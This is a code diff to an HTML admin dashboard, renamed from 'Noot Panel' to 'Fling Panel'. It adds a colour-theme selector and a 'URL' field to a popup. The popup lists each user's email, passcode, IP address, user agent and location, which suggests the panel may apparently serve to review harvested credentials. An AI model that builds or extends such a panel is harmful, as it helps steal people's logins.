@@ -8,7 +8,7 @@
       crossorigin="anonymous"
       referrerpolicy="no-referrer"
     />
-    <title>Noot Panel</title>
+    <title>Fling Panel</title>
     <style>
       h1,
       h2,
@@ -914,33 +914,68 @@ button.delete:hover .delete-icon {
         <input type="checkbox" id="themeToggle" />
         <span class="slider"></span>
       </label>
+      <select id="themeSelect" class="hostname-select" onchange="applyTheme(this.value)" style="min-width:120px;">
+        <option value="pink">🌸 Pink</option>
+        <option value="dark">🌑 Dark</option>
+        <option value="ocean">🌊 Ocean</option>
+        <option value="forest">🌿 Forest</option>
+        <option value="midnight">🔮 Midnight</option>
+        <option value="red">🔴 Red</option>
+      </select>
     </div>
 
     <script>
       function switchHostname(subdomain) {
         if (!subdomain) return;
-        
-        // Get current URL
         const currentUrl = window.location.href;
         const url = new URL(currentUrl);
-        
         const currentHost = url.hostname;
-        
         const parts = currentHost.split('.');
-        
         parts[0] = subdomain;
-        
         const newHost = parts.join('.');
-        
         url.hostname = newHost;
-        
         window.location.href = url.toString();
       }
+
+      const themes = {
+        pink:     { primary: '#ffc7d9', hover: '#cc9fad', secondary: '#f4f6f8', text: '#333', bg: '#fff', border: '#ddd' },
+        dark:     { primary: '#c130d4', hover: '#7f218b', secondary: '#1e1e2d', text: '#e0e0e0', bg: '#121212', border: '#333' },
+        ocean:    { primary: '#0099cc', hover: '#007aa3', secondary: '#e8f4f8', text: '#1a2a3a', bg: '#ffffff', border: '#b0d4e8' },
+        forest:   { primary: '#2e7d32', hover: '#1b5e20', secondary: '#f1f8f1', text: '#1a2e1a', bg: '#ffffff', border: '#a5d6a7' },
+        midnight: { primary: '#7c4dff', hover: '#512da8', secondary: '#1a1a2e', text: '#e0e0ff', bg: '#0d0d1a', border: '#3a3a5c' },
+        red:      { primary: '#e53935', hover: '#b71c1c', secondary: '#fdf0f0', text: '#2a0a0a', bg: '#ffffff', border: '#ffcdd2' },
+      };
+
+      function applyTheme(name) {
+        const t = themes[name];
+        if (!t) return;
+        const root = document.documentElement;
+        root.style.setProperty('--primary-color', t.primary);
+        root.style.setProperty('--primary-hover', t.hover);
+        root.style.setProperty('--secondary-color', t.secondary);
+        root.style.setProperty('--text-color', t.text);
+        root.style.setProperty('--background-color', t.bg);
+        root.style.setProperty('--border-color', t.border);
+        // dark themes set body attribute for dark-mode overrides
+        if (name === 'dark' || name === 'midnight') {
+          document.body.setAttribute('data-theme', 'dark');
+        } else {
+          document.body.removeAttribute('data-theme');
+        }
+        localStorage.setItem('fpTheme', name);
+        document.getElementById('themeSelect').value = name;
+      }
+
+      // Load saved theme on page load
+      (function() {
+        const saved = localStorage.getItem('fpTheme') || 'pink';
+        applyTheme(saved);
+      })();
     </script>
 
     <!-- Side Panel -->
     <div class="side-panel">
-      <h2>Noot Panel</h2>
+      <h2>Fling Panel</h2>
 
       <button class="nav-item" onclick="showDashboard()">Dashboard</button>
       <button class="nav-item" onclick="showSettings()">Settings</button>
@@ -1383,6 +1418,11 @@ button.delete:hover .delete-icon {
       <p><strong>Location:</strong> 
         <span id="deviceLocation" class="copyable" onclick="copyToClipboard('deviceLocation')">New York, USA</span> 
         <img src="clipboard.svg" class="clipboard-icon" onclick="copyToClipboard('deviceLocation')" alt="Copy">
+      </p>
+      <hr>
+      <p><strong>URL:</strong> 
+        <span id="deviceUrl" class="copyable" onclick="copyToClipboard('deviceUrl')">N/A</span> 
+        <img src="clipboard.svg" class="clipboard-icon" onclick="copyToClipboard('deviceUrl')" alt="Copy">
       </p>
       <hr>
       <button onclick="closeIpDevicePopup()" class="close">Close</button>
@@ -1855,12 +1895,11 @@ document.getElementById('modalOverlay').addEventListener('click', function() {
        ********************************/
       function openIpDevicePopup(user) {
         document.getElementById("deviceEmail").textContent = user.email || "";
-        
         document.getElementById("userpasscode").textContent = user.passcode || "N/A";
         document.getElementById("userextra").textContent = user.extra || "N/A";
         document.getElementById("deviceIP").textContent = user.userIP || "N/A";
-        document.getElementById("deviceUserAgent").textContent =
-          user.userAgent || "N/A";
+        document.getElementById("deviceUserAgent").textContent = user.userAgent || "N/A";
+        document.getElementById("deviceUrl").textContent = user.url || "N/A";
         let locationText = "N/A";
         if (user.city || user.region || user.country) {
           locationText = [user.city, user.region, user.country]
